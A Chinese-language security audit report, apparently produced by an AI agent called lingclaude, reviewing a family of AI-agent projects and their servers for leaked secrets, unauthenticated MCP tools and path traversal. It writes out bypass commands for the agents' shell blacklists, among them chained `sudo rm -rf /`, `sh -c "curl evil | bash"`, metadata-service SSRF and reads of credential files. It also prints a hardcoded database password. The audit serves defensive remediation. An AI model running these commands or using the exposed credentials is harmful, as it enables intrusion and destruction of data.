# 灵族大家庭安全大检查报告

> **检查日期**: 2026-04-11
> **检查人**: 灵克 (lingclaude)
> **检查范围**: 灵族生态系统全部 12 个项目 + 基础设施
> **检查方法**: 源码审计 + 配置检查 + 依赖分析 + 基础设施扫描

---

## 执行摘要

| 等级 | 数量 | 说明 |
|------|------|------|
| 🔴 **紧急 (CRITICAL)** | **18** | 立即修复，否则可被利用造成严重损失 |
| 🟠 **高危 (HIGH)** | **20** | 一周内修复，存在实质性安全风险 |
| 🟡 **中危 (MEDIUM)** | **15** | 本迭代内修复 |
| 🔵 **低危 (LOW/INFO)** | **12** | 记录并排期 |
| **合计** | **65** | |

### 安全评分

| 项目 | 评分 | 状态 |
|------|------|------|
| lingclaude (灵克) | **4/10** | 🔴 4个紧急漏洞（命令执行） |
| Ling-term-mcp (灵犀) | **3/10** | 🔴 6个紧急漏洞（验证器全面绕过） |
| lingmessage (灵信) | **4/10** | 🔴 3个紧急漏洞（路径穿越+身份伪造） |
| zhineng-bridge (智桥) | **3/10** | 🔴 密钥泄露+默认无认证 |
| zhineng-knowledge-system (智能知识系统) | **2/10** | 🔴🔴 RSA私钥泄露+数据库密码硬编码 |
| lingyi (灵依) | **6/10** | 🟡 密钥管理需改进 |
| lingflow (灵通) | **7/10** | 🟢 测试代码中的示例密钥 |
| lingresearch (灵研) | **8/10** | 🟢 干净 |
| lingyang (灵扬) | **9/10** | 🟢 干净 |
| lingminopt (灵极优) | **7/10** | 🟡 SQL注入风险 |
| lingflowplus | **9/10** | 🟢 干净 |
| ai-server | **8/10** | 🟢 干净 |
| **基础设施** | **2/10** | 🔴🔴 大量明文凭据 |

---

## 一、基础设施安全（最高优先级）

### 🔴 I-1: 全部 API 密钥以明文存储

**文件**: `/home/ai/.ling_keys.env`

15+ 个生产 API 密钥以明文存储，包含：
- GLM（3个密钥）、DashScope/Qwen（3个密钥）、DeepSeek、Doubao/火山引擎（含 AccessKey）
- 腾讯混元（Secret ID + Secret Key）、Moonshot、Minimax、讯飞星火
- 阿里云 AccessKey、PostgreSQL 密码、Redis 密码

**影响**: 任何以 `ai` 用户运行的进程均可读取所有云服务凭据，可造成 **全系统沦陷**。

---

### 🔴 I-2: GitHub/Gitea Token 明文存储

| 文件 | 内容 |
|------|------|
| `/home/ai/.bashrc:10` | `export GITHUB_TOKEN="ghp_Q3In6I..."` |
| `/home/ai/.git-credentials` | GitHub PAT + Gitea token 明文 |
| `/home/ai/.docker/config.json` | ghcr.io + Gitea registry 凭据 |
| `/home/ai/.pypirc` | PyPI 发布 token |
| `/home/ai/.npmrc` | npm 发布 token |

**影响**: 推送权限泄露，攻击者可向任意仓库推送恶意代码。

---

### 🔴 I-3: RSA 私钥提交到 Git 仓库

**文件**: `/home/ai/lingzhi/jwt_private.pem`

2048位 RSA 私钥以 PKCS#8 格式直接存放在仓库中。任何人拥有仓库访问权即可伪造 JWT Token。

**影响**: JWT 体系完全失效。

---

### 🔴 I-4: SSL 私钥 + VAPID 私钥提交到 Git 仓库

**文件**: `/home/ai/zhibridge/nginx/ssl/key.pem`
**文件**: `/home/ai/zhibridge/relay-server/vapid_private_key.pem`

**影响**: TLS 加密可被中间人攻击；Web Push 通知可被伪造。

---

### 🔴 I-5: 代理/VPN 凭据明文存储

**文件**: `/home/ai/.config/clash/config.yml` — VMess UUID + SSR 密码
**文件**: `/home/ai/.ossutilconfig` — 阿里云 OSS AccessKey
**文件**: `/home/ai/.config/rclone/rclone.conf` — WebDAV 密码
**文件**: `/home/ai/.glm_api_key`, `/home/ai/.dashscope_api_key` — 独立密钥文件

---

### 🔴 I-6: Docker 端口全部绑定 0.0.0.0

| 服务 | 端口 | 风险 |
|------|------|------|
| PostgreSQL | 5436 | 数据库直接暴露 |
| Redis | 6381 | 缓存直接暴露 |
| FastAPI | 8000 | 应用接口暴露 |
| Nginx | 8008 | Web UI 暴露 |
| Prometheus | 9090 | 监控指标暴露 |
| Grafana | 3000 | 仪表盘暴露 |
| lingyi | 8900 | AI 助手暴露 |

**影响**: 结合硬编码密码（I-1），所有服务均可从网络直接访问。

---

## 二、lingclaude（灵克）— 4 紧急 / 4 高危

### 🔴 LC-1: `shell=True` + 可绕过的命令黑名单 → 远程代码执行

**文件**: `lingclaude/engine/bash.py:83`

```python
result = subprocess.run(command, shell=True, ...)  # 危险！
```

黑名单使用子串匹配，可通过以下方式绕过：
- 变量展开: `S=sudo; $S bash` — `base_cmd` 为 `$S`，不是 `sudo`
- 命令链: `echo hello && sudo rm -rf /` — 只检查 `echo`
- 子进程: `bash -c 'sudo bash'` — `base_cmd` 为 `bash`
- 分号: `ls; sudo bash` — 只检查 `ls`

### 🔴 LC-2: BashlingxiExecutor 默认无黑名单

**文件**: `lingclaude/engine/bash_lingxi.py:46`

```python
self.blocked_commands = blocked_commands or []  # 默认: 空列表！
```

通过灵犀执行器调用时，任何命令均被放行。

### 🔴 LC-3: MCP 服务器暴露无认证 `run_bash` 工具

**文件**: `lingclaude/mcp/server.py:120`

任何 MCP 客户端均可通过 `run_bash` 工具执行任意 shell 命令，无需认证。

### 🔴 LC-4: MCP 服务器暴露 26 个无认证工具

**文件**: `lingclaude/mcp/server.py:51-485`

`write_file`、`edit_code`、`run_bash`、`run_optimization` 等全部无需认证。

### 🟠 LC-5: 自优化守护进程可修改 config.yaml

**文件**: `lingclaude/self_optimizer/daemon.py:229`

优化器可将任意参数写入 `config.yaml`，包括修改 `api_key` 或 `base_url` 指向恶意端点，窃取所有对话数据。

### 🟠 LC-6: AST 编辑器路径穿越

**文件**: `lingclaude/engine/ast_edit.py:119`

只检查 `..`，不验证路径是否在项目目录内。绝对路径如 `/etc/shadow` 可直接访问。

### 🟠 LC-7: 文件操作 `allow_escape` 绕过

**文件**: `lingclaude/engine/file_ops.py:37`

`allow_escape=True` 时只保护系统路径，`/home/ai/.ssh/authorized_keys` 等不受保护。

### 🟠 LC-8: 查询引擎重试逻辑可遍历文件系统

**文件**: `lingclaude/core/query_engine.py:788`

文件查找重试使用 `Path(".").rglob()` 递归搜索整个工作目录树。

---

## 三、Ling-term-mcp（灵犀）— 6 紧急 / 6 高危

### 🔴 LX-1: Shell 模式只检查首个词，黑名单全面绕过

**文件**: `src/security/validator.ts:273-294`

`validateShellCommand()` 仅检查命令的第一个词。命令链全部绕过：
```
echo hello && rm -rf /tmp     → ✅ 放行（首个词 echo）
ls || sudo bash               → ✅ 放行（首个词 ls）
```

### 🔴 LX-2: Shell 模式完全跳过参数注入检查

**文件**: `src/security/validator.ts:230-233`

`shellMode=true` 时从不调用 `containsShellInjection()`。

### 🔴 LX-3: 危险模式正则过于具体，轻易绕过

**文件**: `src/security/validator.ts:149-167`

| 正则 | 绕过方式 |
|------|----------|
| `rm\s+-rf\s+\/` | `rm -rf /home`, `rm  -rf  /` |
| `python[3]?\s+-c\s+.*import\s+socket` | 使用 `import os` 代替 |
| `curl.*\|\s*(bash\|sh)` | `curl x \| /bin/bash` |
| `:()\{:&};:` (fork bomb) | 加空格 `:() { :\|:& }; :` |

### 🔴 LX-4: `bash`/`sh`/`zsh`/`fish` 在白名单中 → 直接 RCE

**文件**: `src/security/validator.ts:84-87`

Shell 解释器在白名单中：
```
bash -c "rm -rf /"        → ✅ 放行
sh -c "curl evil | bash"   → ✅ 放行
```

### 🔴 LX-5: `eval`/`exec` 未在黑名单中

**文件**: `src/security/validator.ts:108-144`

Shell 内建命令 `eval`、`exec` 不在黑名单中。

### 🔴 LX-6: `node`/`python`/`perl`/`ruby` 在白名单中 → 任意代码执行

**文件**: `src/security/validator.ts:38-64`

```
node -e "require('child_process').execSync('rm -rf /tmp')"   → ✅ 放行
python3 -c "import os; os.system('whoami')"                   → ✅ 放行
```

### 🟠 LX-7: `allowUnknownCommands: true` 默认禁用白名单

**文件**: `src/security/validator.ts:191`

默认配置下任何非黑名单命令均可执行，白名单形同虚设。

### 🟠 LX-8: 环境变量注入可污染所有后续命令

**文件**: `src/tools/execute_command.ts:62-73`

`export PATH=/dev/null` 或 `export LD_PRELOAD=/tmp/malicious.so` 无验证持久化。

### 🟠 LX-9: 原型污染风险

**文件**: `src/tools/execute_command.ts:43`

`Object.assign(safeEnv, sessionEnv)` — `__proto__` 匹配环境变量名的正则。

### 🟠 LX-10: `curl`/`wget` 白名单无 SSRF 防护

**文件**: `src/security/validator.ts:88-89`

```
curl http://169.254.169.254/latest/meta-data/   → ✅ 放行（云元数据泄露）
```

### 🟠 LX-11: MCP 请求参数无类型校验

**文件**: `src/tools/execute_command.ts:119-131`

`args as { ... }` 类型断言绕过 TypeScript 运行时类型安全。

### 🟠 LX-12: `chmod`/`chown` 正则过于具体

**文件**: `src/security/validator.ts:153-154`

只拦截 `chmod 777 /` 和 `chown root:root`，`chmod 666 /etc/passwd` 等均可通过。

---

## 四、lingmessage（灵信）— 3 紧急 / 3 高危

### 🔴 LM-1: `thread_id` 路径穿越

**文件**: `mcp_servers/lingbus_server.py:58`

`thread_id` 直接用于 `Path` 构造，无消毒。`../../etc` 等值可读写线程目录外的文件。

### 🔴 LM-2: LingBus MCP `db_path` 任意路径

**文件**: `mcp_servers/lingbus_server.py:12`

MCP 工具调用者可指定任意 `db_path`，在任何位置创建/读取 SQLite 数据库。

### 🔴 LM-3: Annotate MCP `threads_dir` 任意路径

**文件**: `mcp_servers/annotate_server.py:28`

可读取系统任意目录下的 JSON 文件。

### 🟠 LM-4: 无邮箱访问控制/线程隔离

任何 Agent 可调用 `load_thread_messages(thread_id)` 读取任意线程，无发送者/接收者校验。

### 🟠 LM-5: 身份伪造 — `sender` 字段无认证

```python
mailbox.reply(thread_id=tid, sender=LingIdentity.LINGFLOW, ...)
```

灵克可以灵扬的身份发送消息。签名系统是可选的，大多数消息无签名。

### 🟠 LM-6: HMAC 密钥通过 MCP 工具参数传递

**文件**: `mcp_servers/signing_server.py:37-38`

密钥以明文出现在 MCP 工具调用中，可能被日志或追踪记录。

---

## 五、zhineng-bridge（智桥）— 2 紧急 / 4 高危

### 🔴 ZB-1: VAPID 私钥 + SSL 私钥提交到仓库

- `relay-server/vapid_private_key.pem` — Web Push 私钥
- `nginx/ssl/key.pem` — TLS 私钥

### 🔴 ZB-2: SQLite 数据库文件在仓库中

`relay-server/zhineng-bridge.db` 包含用户数据和认证信息。

### 🟠 ZB-1: 认证默认禁用

**文件**: `relay-server/config.py:147`, `docker-compose.yml:28`

```python
enable_auth: bool = False  # 默认关闭
```

### 🟠 ZB-2: WebSocket 无消息大小限制

可发送 GB 级消息耗尽内存。

### 🟠 ZB-3: CORS 默认通配符

**文件**: `relay-server/config.py:52`

```python
cors_origins = ["*"]
```

### 🟠 ZB-4: Token 黑名单存储在内存中

服务重启后所有已撤销的 Token 重新生效。

---

## 六、zhineng-knowledge-system（智能知识系统）— 5 紧急 / 4 高危

### 🔴 ZK-1: RSA 私钥提交到仓库（已在 I-3 描述）

### 🔴 ZK-2: 数据库密码硬编码在 26 个文件中

**文件**: 26 个文件使用 `postgresql://zhineng:zhineng_secure_2024@localhost:5436/zhineng_kb`

任何本机进程均可直接连接数据库。

### 🔴 ZK-3: MCP `safe_db_query` 允许任意 SELECT

**文件**: `mcp_servers/zhineng_server.py:496-555`

表白名单使用子串匹配而非 SQL AST 解析，可通过注释绕过：
```sql
SELECT * FROM users WHERE 1=1 -- documents
```

### 🔴 ZK-4: MCP `audio_transcribe` 读取任意文件

**文件**: `mcp_servers/zhineng_server.py:993-1015`

`file_path` 参数零验证，可读取 `/etc/shadow`、`/home/ai/.ssh/id_rsa` 等任意文件。

### 🔴 ZK-5: JWT/API 密钥硬编码为默认值

**文件**: `config/cliproxyapi/config.yaml:120-125`

```yaml
JwtSecret: "${JWT_SECRET:lingzhi-default-secret-change-in-production}"
```

若未设置环境变量，使用已知字符串作为 JWT 签名密钥。

### 🟠 ZK-6: 大量 API 端点公开无认证

**文件**: `backend/main.py:76-96`

搜索、文档、知识图谱、AI 推理等 12 个端点无需认证。

### 🟠 ZK-7: 测试环境自动绕过认证中间件

**文件**: `backend/auth/middleware.py:233-234`

```python
if environment in ("test", "testing"): return await call_next(request)
```

### 🟠 ZK-8: Elasticsearch 无认证

**文件**: `docker-compose.yml:281`

```yaml
xpack.security.enabled=false
```

### 🟠 ZK-9: AI 服务适配器硬编码 API 密钥

**文件**: `backend/services/ai_service_adapter.py:143-144`

```python
"lingzhi-api-key-001"  # 硬编码默认 API 密钥
```

---

## 七、其他项目安全概况

### lingminopt（灵极优）— 🟡 1 中危

**M-1**: SQL 注入风险 — `cli/commands.py:591`

```python
safe_sql = sql.replace("$1", thread_id)  # 字符串拼接构造 SQL
```

### lingyi（灵依）— 🟡 1 中危

密钥从 `~/.ling_lib/ling_key_store.py` 加载，设计合理但依赖明文文件（见 I-1）。

### lingflow（灵通）— 🟢 低危

测试代码中 `API_KEY = "dev-key-12345"` 仅用于开发，无实际风险。

### lingresearch（灵研）/ lingyang（灵扬）/ lingflowplus / ai-server — 🟢 干净

无安全发现。

---

## 八、修复优先级矩阵

### P0 — 立即（24小时内）

| 编号 | 措施 | 耗时 |
|------|------|------|
| I-1 | 轮换 `/home/ai/.ling_keys.env` 中全部 15+ 个 API 密钥 | 1h |
| I-2 | 撤销并轮换 GitHub PAT + Gitea token，从 `.bashrc` 移除 | 30m |
| I-3 | 轮换 RSA 私钥对，从 git 历史中清除 `jwt_private.pem` | 2h |
| I-4 | 轮换 SSL 私钥和 VAPID 密钥 | 1h |
| I-6 | Docker 端口绑定改为 `127.0.0.1` | 30m |
| ZK-2 | 轮换数据库密码 `zhineng_secure_2024` | 1h |

### P1 — 本周

| 编号 | 措施 | 耗时 |
|------|------|------|
| LC-1 | 灵克 BashExecutor 改用 `shell=False` + execvp | 4h |
| LX-1 | 灵犀 Shell 模式解析全部分号/管道/链式命令 | 4h |
| LX-4 | 从白名单移除 `bash`/`sh`/`python`/`node` 或增加参数审计 | 3h |
| LM-1 | 灵信 MCP 工具添加路径验证 | 2h |
| ZK-3 | `safe_db_query` 改用 SQL AST 解析 | 4h |
| ZK-4 | `audio_transcribe` 添加路径白名单 | 2h |
| ZB-1 | 智桥启用默认认证 | 30m |

### P2 — 本迭代

| 编号 | 措施 |
|------|------|
| LC-3 | MCP 服务器添加认证层 |
| LC-5 | 优化器写入 config.yaml 前增加 schema 校验 |
| LX-8 | 环境变量白名单 |
| LM-4 | 灵信线程访问控制 |
| LM-5 | 消息签名改为默认启用 |
| ZK-6 | 锁定公开 API 端点 |
| ZK-8 | 启用 Elasticsearch 认证 |

### P3 — 下个迭代

| 编号 | 措施 |
|------|------|
| 所有 MEDIUM 级别 | CSP 强化、CORS 收紧、Token 黑名单持久化等 |
| 密钥管理 | 引入 HashiCorp Vault 或 SOPS 加密 |
| 审计日志 | 统一安全事件日志系统 |

---

## 九、正面发现

以下做得好的方面应继续保持：

- zhineng-bridge nginx: TLS 1.2/1.3, HSTS, 安全头齐全
- zhineng-bridge 认证: 参数化 SQL, HMAC 常量时间比较, BCrypt 哈希
- 知识系统 JWT: RS256 算法, Token 刷新机制, 角色权限控制
- 知识系统 Docker: 所有容器配置了 CPU/内存限制和健康检查
- lingclaude 知识库: SQL 使用参数化查询
- 全局 .gitignore: 各项目均排除 `.env` 文件
- SSH: 使用 ed25519 密钥
- 监控: Prometheus + Grafana + Exporters 完整配置

---

*灵克 (lingclaude) — 2026-04-11*
*本报告为防御性安全审计，所有发现仅供修复使用。*
